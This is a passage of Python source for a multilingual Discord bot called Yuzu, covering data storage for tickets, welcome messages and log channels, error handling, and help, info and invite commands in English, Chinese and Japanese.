# discord_bot.py
#
''' ----- imports ----- '''
import discord
import os
import asyncio
import random
import requests
import pytz
import re
import logging
import html
import json
import io
import uuid
import string
import yt_dlp
from yt_dlp import YoutubeDL
import shutil
import spotipy
import threading
import ssl
import time
import subprocess
import google.generativeai as genai
from discord import app_commands, Forbidden, HTTPException, NotFound
from discord.ext import commands, tasks
from discord.ext.commands import has_permissions, CheckFailure
from discord.ui import Modal, TextInput, View, Button, Select
from dotenv import load_dotenv
from bs4 import BeautifulSoup
from collections import defaultdict
from datetime import datetime, timedelta, timezone as pytz_timezone
from flask import Flask, redirect, request, session, render_template, url_for, jsonify
from spotipy import Spotify
from spotipy.oauth2 import SpotifyClientCredentials
from threading import Thread
from asyncio import Lock
from collections import deque

''' ----- imports ----- '''
#
#
#
''' ----- Bot Settings ----- '''

load_dotenv()
TOKEN = os.getenv("BOTTOKEN")
intents = discord.Intents.all()

bot = commands.Bot(command_prefix="$", intents=intents, application_id=os.getenv("DISCORD_CLIENT_ID"))
genaitoken = os.getenv("GOOGLE_API_KEY")
genai.configure(api_key=genaitoken)
model = genai.GenerativeModel('gemini-1.5-flash-8b')

''' ----- Bot Settings ----- '''
#
#
#
''' ----- Data ----- '''

BOT_DATA_PATH = os.path.join("bot", "bot_data")
CONSOLELOGS_PATH = os.path.join(BOT_DATA_PATH, "consolelogs")
TICKETDATA = os.path.join(BOT_DATA_PATH, "ticketdata")
DATAFILE_PATH = os.path.join(BOT_DATA_PATH, "datafile")
LANGUAGE_GUILDS_SETTINGS_FILE = os.path.join("bot", "bot_data", "datafile", "language_guilds_settings.json")

os.makedirs(CONSOLELOGS_PATH, exist_ok=True)
os.makedirs(TICKETDATA, exist_ok=True)
os.makedirs(DATAFILE_PATH, exist_ok=True)

log_filename = datetime.now().strftime(os.path.join(CONSOLELOGS_PATH, "%Y-%m-%d_%H-%M-%S.txt"))
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler(log_filename, encoding="utf-8"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger()

EMBEDS_FILE = os.path.join(TICKETDATA, "ticket_embeds.json")
WELCOME_MESSAGE_FILE = os.path.join(DATAFILE_PATH, "welcomemessage.json")
LOG_CHANNELS_FILE = os.path.join(DATAFILE_PATH, "logchannels.json")
WORKSPACE = "workspace"

ticket_embeds = {}
welcome_messages = {}
logging_channel_ids = {}
invite_cache = {}

def load_ticket_embeds():
    global ticket_embeds
    try:
        if not os.path.exists(EMBEDS_FILE):
            os.makedirs(TICKETDATA, exist_ok=True)
            with open(EMBEDS_FILE, "w") as file:
                json.dump({}, file, indent=4)
            logging.info("Created a new empty ticket_embeds.json file.")
            ticket_embeds = {}
            return

        with open(EMBEDS_FILE, "r") as file:
            data = json.load(file)
            if isinstance(data, dict):
                ticket_embeds = data
                logging.info("Successfully loaded ticket embeds.")
            else:
                ticket_embeds = {}
                logging.warning("Invalid format in ticket_embeds.json. Using an empty dictionary.")
    except json.JSONDecodeError as e:
        ticket_embeds = {}
        logging.warning("Failed to decode ticket_embeds.json. Using an empty dictionary.")
        handle_exception(None, "load_ticket_embeds", "Failure", error=e)
    except Exception as e:
        ticket_embeds = {}
        logging.error(f"Unexpected error while loading ticket_embeds.json: {e}")
        handle_exception(None, "load_ticket_embeds", "Failure", error=e)

def save_ticket_embeds():
    try:
        with open(EMBEDS_FILE, "w") as file:
            json.dump(ticket_embeds, file, indent=4)
    except Exception as e:
        logging.error(f"Failed to save ticket_embeds.json: {e}")
        handle_exception(None, "save_ticket_embeds", "Failure", error=e)

def load_log_channels():
    try:
        if not os.path.exists(LOG_CHANNELS_FILE):
            os.makedirs(os.path.dirname(LOG_CHANNELS_FILE), exist_ok=True)
            with open(LOG_CHANNELS_FILE, "w") as f:
                json.dump({}, f)
            return {}

        with open(LOG_CHANNELS_FILE, "r") as f:
            data = json.load(f)
        return data
    except json.JSONDecodeError as e:
        logging.warning("Failed to decode logchannels.json. Using an empty dictionary.")
        handle_exception(None, "load_log_channels", "Failure", error=e)
        return {}
    except Exception as e:
        logging.error(f"Unexpected error while loading logchannels.json: {e}")
        handle_exception(None, "load_log_channels", "Failure", error=e)
        return {}

def save_log_channels(data):
    try:
        with open(LOG_CHANNELS_FILE, "w") as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        logging.error(f"Failed to save logchannels.json: {e}")
        handle_exception(None, "save_log_channels", "Failure", error=e)

def save_or_update_log_channel(guild_id, channel_id, user_id, timestamp):
    try:
        data = load_log_channels()
        data[str(guild_id)] = {
            "channel_id": channel_id,
            "user_id": user_id,
            "timestamp": timestamp
        }
        save_log_channels(data)
    except Exception as e:
        logging.error(f"Failed to save or update log channel for guild {guild_id}: {e}")
        handle_exception(None, "save_or_update_log_channel", "Failure", error=e)

def remove_log_channel(guild_id):
    try:
        data = load_log_channels()
        if str(guild_id) in data:
            del data[str(guild_id)]
            save_log_channels(data)
            return True
        return False
    except Exception as e:
        logging.error(f"Failed to remove log channel for guild {guild_id}: {e}")
        handle_exception(None, "remove_log_channel", "Failure", error=e)
        return False

def load_welcome_messages():
    try:
        os.makedirs(os.path.dirname(WELCOME_MESSAGE_FILE), exist_ok=True)

        if not os.path.exists(WELCOME_MESSAGE_FILE):
            with open(WELCOME_MESSAGE_FILE, "w") as file:
                json.dump({}, file, indent=4)
            logging.info("Created a new empty welcomemessage.json file.")
            return {}

        with open(WELCOME_MESSAGE_FILE, "r") as file:
            data = json.load(file)
            if isinstance(data, dict):
                return data
            else:
                logging.warning("Invalid format in welcomemessage.json. Using an empty dictionary.")
                return {}
    except json.JSONDecodeError as e:
        logging.warning("Failed to decode welcomemessage.json. Using an empty dictionary.")
        handle_exception(None, "load_welcome_messages", "Failure", error=e)
        return {}
    except Exception as e:
        logging.error(f"Unexpected error while loading welcomemessage.json: {e}")
        handle_exception(None, "load_welcome_messages", "Failure", error=e)
        return {}

def save_welcome_messages():
    try:
        os.makedirs(os.path.dirname(WELCOME_MESSAGE_FILE), exist_ok=True)

        with open(WELCOME_MESSAGE_FILE, "w") as file:
            json.dump(welcome_messages, file, indent=4)
    except Exception as e:
        logging.error(f"Failed to save welcomemessage.json: {e}")
        handle_exception(None, "save_welcome_messages", "Failure", error=e)

def save_or_update_welcome_message(guild_id, channel_id, user_id, title, desc, message_type, image_url, timestamp):
    try:
        welcome_messages[str(guild_id)] = {
            "channel_id": channel_id,
            "user_id": user_id,
            "welcome_message": {
                "title": title,
                "desc": desc,
                "type": message_type,
                "image_url": image_url,
            },
            "timestamp": timestamp
        }
        save_welcome_messages()
        logging.info(f"Welcome message for guild {guild_id} updated.")
    except Exception as e:
        logging.error(f"Failed to save or update welcome message for guild {guild_id}: {e}")
        handle_exception(None, "save_or_update_welcome_message", "Failure", error=e)

def remove_welcome_message(guild_id):
    try:
        if str(guild_id) in welcome_messages:
            del welcome_messages[str(guild_id)]
            save_welcome_messages()
            logging.info(f"Welcome message for guild {guild_id} removed.")
            return True
        return False
    except Exception as e:
        logging.error(f"Failed to remove welcome message for guild {guild_id}: {e}")
        handle_exception(None, "remove_welcome_message", "Failure", error=e)
        return False

def cleanup_downloaded_music():
    music_path = os.path.join(WORKSPACE, "downloaded_music")
    try:
        if os.path.exists(music_path):
            shutil.rmtree(music_path)
            os.makedirs(music_path)
        else:
            os.makedirs(music_path)
    except Exception as e:
        logging.error(f"Error cleaning up downloaded music: {e}")
        handle_exception(None, "cleanup_downloaded_music", "Failure", error=e)

def load_language_settings():
    try:
        with open(LANGUAGE_GUILDS_SETTINGS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_language_settings(settings):
    with open(LANGUAGE_GUILDS_SETTINGS_FILE, "w", encoding="utf-8") as f:
        json.dump(settings, f, indent=4, ensure_ascii=False)

async def set_language(guild_id, language_code):
    settings = load_language_settings()
    settings[str(guild_id)] = language_code
    save_language_settings(settings)

def get_language(guild_id):
    settings = load_language_settings()
    return settings.get(str(guild_id), "en")

''' ----- Data ----- '''
#
#
#
''' ----- Handles ----- '''

async def handle_cooldown_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        embed = discord.Embed(
            title="⏳ Cooldown!",
            description=f"Please wait {round(error.retry_after, 1)} seconds before using this command again.",
            color=0xFF0000 
        )
        await ctx.send(embed=embed)
        
async def handle_exception(source, identifier, status, error=None):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    severity = "ERROR" if status == "Failure" else "INFO"

    if hasattr(source, "guild") and source.guild:
        language = get_language(source.guild.id)
    else:
        language = "en"

    ERROR_MESSAGES = {
        "en": {
            "permission_denied": "Permission Denied: Bot lacks necessary permissions.",
            "http_exception": "HTTP Exception: Network error with Discord API.",
            "not_found": "Not Found: Requested resource is missing.",
            "unexpected_error": "Unexpected Error: {error}",
            "no_error": "No error message provided.",
            "notification": "⚠️ An error occurred in `{identifier}`: {error_message}"
        },
        "zh": {
            "permission_denied": "權限被拒絕：機器人缺少必要的權限。",
            "http_exception": "HTTP 異常：Discord API 網絡錯誤。",
            "not_found": "未找到：請求的資源缺失。",
            "unexpected_error": "意外錯誤：{error}",
            "no_error": "沒有提供錯誤訊息。",
            "notification": "⚠️ `{identifier}` 中發生錯誤：{error_message}"
        },
        "ja": {
            "permission_denied": "権限拒否: Botに必要な権限がありません。",
            "http_exception": "HTTP 例外: Discord APIのネットワークエラー。",
            "not_found": "未発見: リクエストされたリソースがありません。",
            "unexpected_error": "予期しないエラー: {error}",
            "no_error": "エラーメッセージは提供されていません。",
            "notification": "⚠️ `{identifier}` でエラーが発生しました：{error_message}"
        }
    }
    
    error_messages = ERROR_MESSAGES.get(language, ERROR_MESSAGES["en"])

    if hasattr(source, "command"):
        context_type = "Command"
    elif hasattr(source, "guild") or hasattr(source, "channel"):
        context_type = "Event"
    else:
        context_type = "Unknown Source"
        location = "Unknown Location"
        user_info = "Unknown User"

    if hasattr(source, "guild") and source.guild:
        location = f"Server: {source.guild.name} (ID: {source.guild.id}) | Channel: {source.channel.name} (ID: {source.channel.id})"
    elif hasattr(source, "author"):
        location = f"Direct Message (User: {source.author})"
    else:
        location = "Unknown Location"

    user_info = (
        f"User: {source.author} (ID: {source.author.id})" if hasattr(source, "author")
        else f"Member: {source.name} (ID: {source.id})" if hasattr(source, "name")
        else "Unknown User"
    )
    
    if status == "Failure":
        if isinstance(error, Forbidden):
            error_message = error_messages["permission_denied"]
        elif isinstance(error, HTTPException):
            error_message = error_messages["http_exception"]
        elif isinstance(error, NotFound):
            error_message = error_messages["not_found"]
        else:
            error_message = error_messages["unexpected_error"].format(error=error)
    else:
        error_message = error_messages["no_error"]

    if status == "Failure":
        logger.error(f"[{timestamp}] [{severity}] {context_type} '{identifier}' FAILURE | {location} | {user_info} | Error: {error_message}")
    else:
        logger.info(f"[{timestamp}] [{severity}] {context_type} '{identifier}' SUCCESS | {location} | {user_info}")

    if status == "Failure" and severity == "ERROR" and hasattr(source, "send"):
        try:
            notification_message = error_messages["notification"].format(identifier=identifier, error_message=error_message)
            await source.send(notification_message)
        except Forbidden:
            logger.warning(f"Unable to notify user in {location} due to permission restrictions.")

''' ----- Handles ----- '''
#
#
#
''' ----- Bot Events ----- '''

# bot ready
@bot.event
async def on_ready():
    global logging_channel_ids, invite_cache, welcome_messages
    
    game = discord.Activity(type=discord.ActivityType.watching, name="haiya")
    logger.info(f'Bot has logged in as {bot.user}!')
    statuses = [discord.Status.idle, discord.Status.dnd, discord.Status.online]

    async def change_activity():
        status_index = 0
        while True:
            try:
                await bot.change_presence(status=statuses[status_index], activity=game)
                status_index = (status_index + 1) % len(statuses)
                await asyncio.sleep(1)
            except Exception as e:
                await handle_exception(bot, "change_activity", "Failure", error=e)
                logger.error(f"Error updating presence: {e}")

    bot.loop.create_task(change_activity())

    try:
        if ticket_embeds is None:
            load_ticket_embeds()
    except Exception as e:
        await handle_exception(bot, "load_ticket_embeds", "Failure", error=e)

    try:
        log_channels_data = load_log_channels()
        logging_channel_ids = {}

        for guild_id, data in log_channels_data.items():
            guild = bot.get_guild(int(guild_id))
            if guild:
                channel = guild.get_channel(data["channel_id"])
                if channel:
                    logging_channel_ids[int(guild_id)] = channel.id
                    logger.info(f"Logging channel for guild {guild_id} set to channel {channel.id}")
    except Exception as e:
        await handle_exception(bot, "load_log_channels", "Failure", error=e)

    try:
        welcome_messages = load_welcome_messages()
    except Exception as e:
        await handle_exception(bot, "load_welcome_messages", "Failure", error=e)

    for guild in bot.guilds:
        try:
            invite_cache[guild.id] = await guild.invites()
        except Exception as e:
            await handle_exception(bot, f"fetch_invites_{guild.id}", "Failure", error=e)
            logger.info(f"Failed to fetch invites for guild {guild.id}: {e}")
            
    if shutil.which("ffmpeg") is None:
        logger.info("FFmpeg is not installed. Please install FFmpeg to use voice features.")

    try:
        cleanup_downloaded_music()
        logger.info("Just cleaned up old files.")
    except Exception as e:
        await handle_exception(bot, "cleanup_downloaded_music", "Failure", error=e)

    for guild in bot.guilds:
        try:
            await bot.tree.sync(guild=discord.Object(id=guild.id))
        except Exception as e:
            await handle_exception(bot, f"sync_guild_{guild.id}", "Failure", error=e)

    for ticket_id, ticket_data in ticket_embeds.items():
        try:
            guild = bot.get_guild(ticket_data["guild_id"])
            if guild:
                channel = guild.get_channel(ticket_data["channel_id"])
                if channel:
                    try:
                        message = await channel.fetch_message(ticket_data["message_id"])
                        view = SupportTicketView(ticket_embed_id=ticket_id, button_label=ticket_data["button_label"])
                        await message.edit(view=view)
                        logger.info(f"Reconnected ticket button for ticket ID {ticket_id}")
                    except discord.NotFound:
                        logger.info(f"Ticket message for ticket ID {ticket_id} not found in channel {channel.id}")
                    except discord.Forbidden:
                        logger.warning(f"Missing permissions to fetch message or edit view in channel {channel.id}")
        except Exception as e:
            await handle_exception(bot, f"reconnect_ticket_{ticket_id}", "Failure", error=e)
            print(f"Failed to reconnect ticket button for ticket ID {ticket_id}: {e}")

# Bot joined the server (Check who invited and the datetime)
@bot.event
async def on_guild_join(guild):
    join_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                await channel.send("Hello! Thanks for inviting me!")
                break
    except Exception as e:
        await handle_exception(guild, "send_welcome_message", "Failure", error=e)

    inviter = None
    try:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
            inviter = entry.user
        inviter_info = f"{inviter} (ID: {inviter.id})" if inviter else "Unknown"
        print(f"[{join_time}] Bot was invited to '{guild.name}' (ID: {guild.id}) by {inviter_info}")
    except Exception as e:
        await handle_exception(guild, "log_inviter", "Failure", error=e)

# Bot has been kicked from the server (Check the bot has been removed from which server)
@bot.event
async def on_guild_remove(guild):
    leave_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        print(f"[{leave_time}] Bot was removed from '{guild.name}' (ID: {guild.id})")
    except Exception as e:
        await handle_exception(guild, "on_guild_remove", "Failure", error=e)

''' ----- Bot Events ----- '''
#
#
#
''' ----- Basic Commands ----- '''

# language command
@bot.command(name='language')
@commands.has_permissions(administrator=True)
async def language(ctx, lang_code: str):
    if ctx.guild is None:
        await ctx.send(embed=discord.Embed(
            title="Command Not Available in DM",
            description="This command can only be used in a server.",
            color=discord.Color.red()
        ))
        return

    lang_code = lang_code.lower()
    supported_languages = ["en", "ja", "zh"]

    if lang_code not in supported_languages:
        await ctx.send(embed=discord.Embed(
            title="Invalid Language Code",
            description="Supported language codes are: `en` (English), `ja` (Japanese), `zh` (Chinese).",
            color=discord.Color.red()
        ))
        return

    await set_language(ctx.guild.id, lang_code)

    MESSAGES = {
        "en": {
            "title": "Language Updated",
            "description": "The bot language has been set to English."
        },
        "ja": {
            "title": "言語が更新されました",
            "description": "ボットの言語が日本語に設定されました。"
        },
        "zh": {
            "title": "語言已更新",
            "description": "機器人語言已設置為繁體中文。"
        }
    }

    embed = discord.Embed(
        title=MESSAGES[lang_code]["title"],
        description=MESSAGES[lang_code]["description"],
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)
@language.error
async def language_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send(embed=discord.Embed(
            title="Permission Denied",
            description="Only administrators can change the bot language.",
            color=discord.Color.red()
        ))
    else:
        await ctx.send(embed=discord.Embed(
            title="Error",
            description="An unexpected error occurred. Please try again.",
            color=discord.Color.red()
        ))

# help
COMMAND_HELP_TEXTS = {
    "zh": {
        "main_embed": {
            "title": "Yuzu bot指令列表",
            "description": "從下拉選單中選擇一個類別以查看相關指令。",
            "select_placeholder": "選擇您需要幫助的內容"
        },
        "options": {
            "general": {"label": "一般指令", "description": "機器人的一般指令", "emoji": "📝"},
            "fun": {"label": "娛樂指令", "description": "娛樂和有趣的指令", "emoji": "🎉"},
            "ticket": {"label": "支援票指令", "description": "管理支援票的指令", "emoji": "🎟️"},
            "logs": {"label": "記錄頻道指令", "description": "管理記錄頻道的指令", "emoji": "📜"},
            "welcome": {"label": "歡迎訊息指令", "description": "設置歡迎訊息的指令", "emoji": "👋"},
            "music": {"label": "音樂指令", "description": "播放和控制音樂指令", "emoji": "🎵"},
            "tools": {"label": "工具指令", "description": "各種工具相關指令", "emoji": "🛠️"}
        },
        "General Commands": {
            "title": "一般指令",
            "commands": {
                "$language en/ja/zh": "更改Yuzu bot語言",
                "$help": "顯示指令幫助",
                "$ping": "確認機器人是否在線",
                "$info": "獲取機器人資訊",
                "$invitebot": "獲取機器人邀請連結"
            }
        },
        "Tools Commands": {
            "title": "工具指令",
            "commands": {
                "$serverlink": "獲取伺服器邀請連結",
                "$typhoonday": "獲取停班停課消息🌀",
                "$timezone": "顯示常見國家的當地時間"
            }
        },
        "Fun Commands": {
            "title": "娛樂指令",
            "commands": {
                "$luck": "測運氣分數🍀",
                "$advice": "隨機建議"
            }
        },
        "Ticket Commands": {
            "title": "支援票指令",
            "commands": {
                "$ticket": "建立支援票",
                "$close": "關閉支援票並生成聊天記錄",
                "$end": "關閉支援票頻道"
            }
        },
        "Logs Channel Commands": {
            "title": "記錄頻道指令",
            "commands": {
                "$setlogschannel <channelid>": "設定記錄頻道",
                "$removelogschannel": "刪除記錄頻道"
            }
        },
        "Welcome Message Commands": {
            "title": "歡迎訊息指令",
            "commands": {
                "$setwelcomechannel <channelid>": "設定歡迎頻道",
                "$setwelcomemessage": "設定歡迎訊息",
                "$removewelcomechannel": "刪除歡迎頻道"
            }
        },
        "Music Commands": {
            "title": "音樂指令",
            "commands": {
                "$play <url of youtube/spotify/soundcloud>": "播放音樂或將音樂添加到隊列",
                "$stop": "停止播放並清空隊列",
                "$loop track/queue/off": "循環播放單曲或整個隊列或關掉",
                "$tracklist": "顯示當前播放隊列",
                "$skip": "跳過當前曲目"
            }
        }
    },
    "ja": {
        "main_embed": {
            "title": "ユズボットコマンドリスト",
            "description": "ドロップダウンからカテゴリを選択して、関連するコマンドを確認できます。",
            "select_placeholder": "助けが必要な内容を選択してください"
        },
        "options": {
            "general": {"label": "一般コマンド", "description": "ボットの一般コマンド", "emoji": "📝"},
            "fun": {"label": "楽しいコマンド", "description": "エンターテイメントと楽しいコマンド", "emoji": "🎉"},
            "ticket": {"label": "チケットコマンド", "description": "チケット管理のコマンド", "emoji": "🎟️"},
            "logs": {"label": "ログチャンネルコマンド", "description": "ログチャンネルの管理コマンド", "emoji": "📜"},
            "welcome": {"label": "ウェルカムメッセージコマンド", "description": "ウェルカムメッセージの設定コマンド", "emoji": "👋"},
            "music": {"label": "音楽コマンド", "description": "音楽を再生および操作するコマンド", "emoji": "🎵"},
            "tools": {"label": "ツールコマンド", "description": "様々なツール関連コマンド", "emoji": "🛠️"}
        },
        "General Commands": {
            "title": "一般コマンド",
            "commands": {
                "$language en/ja/zh": "ユズボットの言語を変更する",
                "$help": "コマンドヘルプを表示",
                "$ping": "ボットがオンラインか確認",
                "$info": "ボットの情報を取得",
                "$invitebot": "ボットの招待リンクを取得"
            }
        },
        "Tools Commands": {
            "title": "ツールコマンド",
            "commands": {
                "$serverlink": "サーバーの招待リンクを取得",
                "$typhoonday": "台湾の台風情報取得🌀",
                "$timezone": "各国の現在時刻を表示"
            }
        },
        "Fun Commands": {
            "title": "楽しいコマンド",
            "commands": {
                "$luck": "運勢を確認🍀",
                "$advice": "ランダムなアドバイス"
            }
        },
        "Ticket Commands": {
            "title": "チケットコマンド",
            "commands": {
                "$ticket": "サポートチケットを作成",
                "$close": "チケットを閉じて記録を生成",
                "$end": "チケットチャネルを閉じる"
            }
        },
        "Logs Channel Commands": {
            "title": "ログチャンネルコマンド",
            "commands": {
                "$setlogschannel <channelid>": "ログチャンネルを設定",
                "$removelogschannel": "ログチャンネルを削除"
            }
        },
        "Welcome Message Commands": {
            "title": "ウェルカムメッセージコマンド",
            "commands": {
                "$setwelcomechannel <channelid>": "ウェルカムチャンネルを設定",
                "$setwelcomemessage": "ウェルカムメッセージを設定",
                "$removewelcomechannel": "ウェルカムチャンネルを削除"
            }
        },
        "Music Commands": {
            "title": "音楽コマンド",
            "commands": {
                "$play <url of youtube/spotify/soundcloud>": "音楽を再生するか、キューに追加する",
                "$stop": "再生を停止してキューをクリア",
                "$loop track/queue/off": "単曲、全キューをループ再生または停止",
                "$tracklist": "現在のキューを表示",
                "$skip": "現在の曲をスキップする"
            }
        }
    },
    "en": {
        "main_embed": {
            "title": "Yuzu bot Command list",
            "description": "Select a category from the dropdown to see relevant commands.",
            "select_placeholder": "Select what you need help with"
        },
        "options": {
            "general": {"label": "General Commands", "description": "General bot commands", "emoji": "📝"},
            "fun": {"label": "Fun Commands", "description": "Entertainment and fun commands", "emoji": "🎉"},
            "ticket": {"label": "Ticket Commands", "description": "Commands for managing tickets", "emoji": "🎟️"},
            "logs": {"label": "Logs Channel Commands", "description": "Commands for logs channel management", "emoji": "📜"},
            "welcome": {"label": "Welcome Message Commands", "description": "Commands for setting welcome messages", "emoji": "👋"},
            "music": {"label": "Music Commands", "description": "Commands for playing and managing music", "emoji": "🎵"},
            "tools": {"label": "Tools Commands", "description": "Various utility-related commands", "emoji": "🛠️"}
        },
        "General Commands": {
            "title": "General Commands",
            "commands": {
                "$language en/ja/zh": "Change the language of Yuzu bot",
                "$help": "Show command help",
                "$ping": "Check if the bot is online",
                "$info": "Get bot information",
                "$invitebot": "Get bot invite link"
            }
        },
        "Tools Commands": {
            "title": "Tools Commands",
            "commands": {
                "$serverlink": "Get server invite link",
                "$typhoonday": "Get Taiwan typhoon day information 🌀",
                "$timezone": "Show local time for some countries"
            }
        },
        "Fun Commands": {
            "title": "Fun Commands",
            "commands": {
                "$luck": "Check luck score 🍀",
                "$advice": "Get random advice"
            }
        },
        "Ticket Commands": {
            "title": "Ticket Commands",
            "commands": {
                "$ticket": "Create a support ticket embed message",
                "$close": "Close the ticket and generate a transcript",
                "$end": "Close the ticket channel"
            }
        },
        "Logs Channel Commands": {
            "title": "Logs Channel Commands",
            "commands": {
                "$setlogschannel <channelid>": "Set up the logs channel",
                "$removelogschannel": "Remove the logs channel from the server"
            }
        },
        "Welcome Message Commands": {
            "title": "Welcome Message Commands",
            "commands": {
                "$setwelcomechannel <channelid>": "Set up the welcome channel",
                "$setwelcomemessage": "Set up the welcome message",
                "$removewelcomechannel": "Remove the welcome channel from the server"
            }
        },
        "Music Commands": {
            "title": "Music Commands",
            "commands": {
                "$play <url of youtube/spotify/soundcloud>": "Play music or add it to the queue",
                "$stop": "Stop playback and clear the queue",
                "$loop track/queue/off": "Loop single track, entire queue, or turn off looping",
                "$tracklist": "Show the current playback queue",
                "$skip": "Skip the current track"
            }
        }
    }
}

class HelpSelectMenu(View):
    def __init__(self, language):
        super().__init__(timeout=None)
        self.language = language
        language_texts = COMMAND_HELP_TEXTS.get(self.language, {})

        options_texts = language_texts.get("options", {})

        select_options = [
            discord.SelectOption(
                label=options_texts["general"]["label"],
                description=options_texts["general"]["description"],
                emoji=options_texts["general"]["emoji"],
                value="General Commands"
            ),
            discord.SelectOption(
                label=options_texts["fun"]["label"],
                description=options_texts["fun"]["description"],
                emoji=options_texts["fun"]["emoji"],
                value="Fun Commands"
            ),
            discord.SelectOption(
                label=options_texts["ticket"]["label"],
                description=options_texts["ticket"]["description"],
                emoji=options_texts["ticket"]["emoji"],
                value="Ticket Commands"
            ),
            discord.SelectOption(
                label=options_texts["logs"]["label"],
                description=options_texts["logs"]["description"],
                emoji=options_texts["logs"]["emoji"],
                value="Logs Channel Commands"
            ),
            discord.SelectOption(
                label=options_texts["welcome"]["label"],
                description=options_texts["welcome"]["description"],
                emoji=options_texts["welcome"]["emoji"],
                value="Welcome Message Commands"
            ),
            discord.SelectOption(
                label=options_texts["music"]["label"],
                description=options_texts["music"]["description"],
                emoji=options_texts["music"]["emoji"],
                value="Music Commands"
            ),
            discord.SelectOption(
                label=options_texts["tools"]["label"],
                description=options_texts["tools"]["description"],
                emoji=options_texts["tools"]["emoji"],
                value="Tools Commands"
            )
        ]

        select = Select(
            placeholder=language_texts["main_embed"]["select_placeholder"],
            options=select_options
        )
        
        select.callback = self.select_callback
        self.add_item(select)

    async def select_callback(self, interaction: discord.Interaction):
        selection = interaction.data["values"][0]
        language_texts = COMMAND_HELP_TEXTS.get(self.language, {})
        category_texts = language_texts.get(selection, {})

        embed = discord.Embed(color=0x5865F2)
        embed.title = category_texts.get("title", "Help")
        
        commands = category_texts.get("commands", {})
        for command, description in commands.items():
            embed.add_field(name=command, value=description, inline=False)
        
        await interaction.response.send_message(embed=embed, ephemeral=True)

bot.remove_command("help")
@bot.command(name="help")
@commands.cooldown(rate=1, per=3, type=commands.BucketType.user)
async def help(ctx):
    try:
        if ctx.guild:
            guild_id = ctx.guild.id
            language = get_language(guild_id)
        else:
            language = "en"

        main_embed_text = COMMAND_HELP_TEXTS[language].get("main_embed", {})

        embed = discord.Embed(
            title=main_embed_text.get("title", "Command Help"),
            description=main_embed_text.get("description", "Select a category to view commands."),
            color=0x5865F2
        )
        await ctx.send(embed=embed, view=HelpSelectMenu(language))
    except commands.CommandOnCooldown as cooldown_error:
        await handle_cooldown_error(ctx, cooldown_error)
    except Exception as error:
        await handle_exception(ctx, "help", "Failure", error)

# info
INFO_TEXTS = {
    "zh": {
        "title": "Yuzu Bot 詳細資訊",
        "description": "Hello, 我的名字是Yuzu, 是一個由badlyac和shino開發出來的Discord bot (●'◡'●),\n如果您遇到問題需要回報請在Discord上聯絡我們, 謝謝! (ids: badlyac, shinoxdd)",
        "github": "[BadlyacX](https://github.com/BadlyacX) [shinoxdd](https://github.com/shinoxdd)",
        "footer": "Thank you for using Yuzu Bot!"
    },
    "ja": {
        "title": "ユズーボット詳細情報",
        "description": "こんにちわ！、僕の名前はユズです。Discordボットとしてbadlyacとshinoによって作成されました (●'◡'●)。\n問題が発生した場合は、Discordで私たちに連絡してください（ID: badlyac, shinoxdd）。",
        "github": "[BadlyacX](https://github.com/BadlyacX) [shinoxdd](https://github.com/shinoxdd)",
        "footer": "Yuzu Botをご利用いただきありがとうございます！"
    },
    "en": {
        "title": "Yuzu Bot Information",
        "description": "Hello, I am Yuzu, a Discord bot developed by badlyac and shino (●'◡'●),\nIf you encounter any problems please contact us on Discord (ids: badlyac, shinoxdd)",
        "github": "[BadlyacX](https://github.com/BadlyacX) [shinoxdd](https://github.com/shinoxdd)",
        "footer": "Thank you for using Yuzu Bot!"
    }
}

@bot.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def info(ctx):
    try:
        if ctx.guild:
            guild_id = ctx.guild.id
            language = get_language(guild_id)
        else:
            language = "en"

        info_text = INFO_TEXTS.get(language, INFO_TEXTS["en"])

        botinfo_embed = discord.Embed(
            title=info_text["title"],
            description=info_text["description"],
            color=discord.Color.green()
        )
        
        botinfo_embed.add_field(
            name="GitHub Repository",
            value=info_text["github"],
            inline=False
        )

        botinfo_embed.set_footer(text=info_text["footer"])

        await ctx.send(embed=botinfo_embed)
        await handle_exception(ctx, "info", "Success")
        
    except Exception as e:
        await handle_exception(ctx, "info", "Failure", error=e)
@info.error
async def info_error(ctx, error):
    await handle_cooldown_error(ctx, error)
    
# serverlink
SERVERLINK_TEXTS = {
    "zh": {
        "title": "伺服器邀請連結",
        "description": "邀請連結: {url}",
        "footer": "此邀請連結一小時內有效。"
    },
    "ja": {
        "title": "サーバー招待リンク",
        "description": "招待リンク: {url}",
        "footer": "この招待リンクは1時間有効です。"
    },
    "en": {
        "title": "Server Invite Link",
        "description": "Invite Link: {url}",
        "footer": "This invite link is valid for one hour."
    }
}

@bot.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def serverlink(ctx):
    try:
        if ctx.guild:
            invite = await ctx.channel.create_invite(max_age=3600, max_uses=99, unique=True)
            guild_id = ctx.guild.id
            language = get_language(guild_id)
        else:
            invite = None
            language = "en"

        link_text = SERVERLINK_TEXTS.get(language, SERVERLINK_TEXTS["en"])

        if invite:
            description = link_text["description"].format(url=invite.url)
        else:
            description = link_text["dm_unavailable"]

        embed = discord.Embed(
            title=link_text["title"],
            description=description,
            color=0x0080FF
        )
        embed.set_footer(text=link_text["footer"])

        await ctx.send(embed=embed)
        await handle_exception(ctx, "serverlink", "Success")
        
    except Exception as e:
        await handle_exception(ctx, "serverlink", "Failure", error=e)
@serverlink.error
async def serverlink_error(ctx, error):
    await handle_exception(ctx, "serverlink", "Failure", error=error)
        
# invitebot
INVITEBOT_TEXTS = {
    "zh": {
        "title": "邀請 Yuzu Bot",
        "description": "點擊下方按鈕邀請 Yuzu Bot 加入您的伺服器！",
        "footer": "感謝您考慮將 Yuzu Bot 加入您的伺服器！",
        "button_label": "邀請 Yuzu Bot"
    },
    "ja": {
        "title": "ユズボットを招待",
